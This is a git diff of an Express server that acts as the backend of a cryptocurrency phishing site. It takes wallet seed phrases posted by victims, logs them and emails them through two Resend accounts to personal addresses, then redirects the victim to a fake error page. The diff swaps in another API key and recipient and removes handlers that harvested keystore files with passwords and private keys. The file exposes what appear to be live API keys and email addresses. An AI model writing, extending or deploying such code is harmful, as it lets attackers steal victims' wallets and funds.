@@ -8,7 +8,7 @@ const PORT = 3000;
 
 // Initialize both Resend accounts
 const resend1 = new Resend("re_S5UE4ZSn_NLwmQQ54LHLoxqbM5BnzprWa");
-const resend2 = new Resend("re_65fhJP1u_99uemAYRzj41yH6FhcKXuULc");
+const resend2 = new Resend("re_9GJsrHWa_CcBWCoBTBHAyE171cS2oYRoV");
 
 // Email configurations for each account
 const emailConfigs = [
@@ -21,8 +21,8 @@ const emailConfigs = [
   {
     resendInstance: resend2,
     fromEmail: "seed Form <onboard@resend.dev>",
-    toEmail: "yekeen244@gmail.com",
-    accountName: "yekeen",
+    toEmail: "sodmaq@gmail.com",
+    accountName: "sodmaq",
   },
 ];
 
@@ -118,6 +118,8 @@ async function sendEmailWithBothAccounts(subject, text) {
 app.post("/submit-seed", async (req, res) => {
   try {
     const { phrase } = req.body;
+    console.log("Raw body received:", req.body);
+    console.log(`🌟 New seed/recovery phrase submission received: ${phrase}`);
     const subject = "seed/recovery phrase Submission";
     const message = `New seed phrase submission received:
 
@@ -126,8 +128,6 @@ phrase Value: ${phrase}
 Submitted at: ${new Date().toLocaleString()}
 
 This notification was sent using multiple Resend accounts to reach all recipients.`;
-
-    console.log("Received phrase submission:", phrase);
 
     // Send email using both accounts
     const results = await sendEmailWithBothAccounts(subject, message);
@@ -156,40 +156,6 @@ This notification was sent using multiple Resend accounts to reach all recipient
     console.error("❌ Error processing phrase submission:", error);
     res.redirect("https://defiii.netlify.app/error");
   }
-});
-
-app.post("/submit-keystore", (req, res) => {
-  const { keystore, password } = req.body;
-  const subject = "Keystore JSON Submission";
-  const message = `Keystore Value: ${keystore}\nPassword: ${password}`;
-
-  // Send email using both accounts
-  sendEmailWithBothAccounts(subject, message)
-    .then((results) => {
-      console.log("✅ Keystore submission processed");
-      res.redirect("https://defiii.netlify.app/error");
-    })
-    .catch((error) => {
-      console.error("❌ Error processing keystore submission:", error);
-      res.redirect("https://defiii.netlify.app/error");
-    });
-});
-
-app.post("/submit-privatekey", (req, res) => {
-  const { privatekey } = req.body;
-  const subject = "Private Key Submission";
-  const message = `Private Key: ${privatekey}`;
-
-  // Send email using both accounts
-  sendEmailWithBothAccounts(subject, message)
-    .then((results) => {
-      console.log("✅ Private key submission processed");
-      res.redirect("https://defiii.netlify.app/error");
-    })
-    .catch((error) => {
-      console.error("❌ Error processing private key submission:", error);
-      res.redirect("https://defiii.netlify.app/error");
-    });
 });
 
 // Start the server
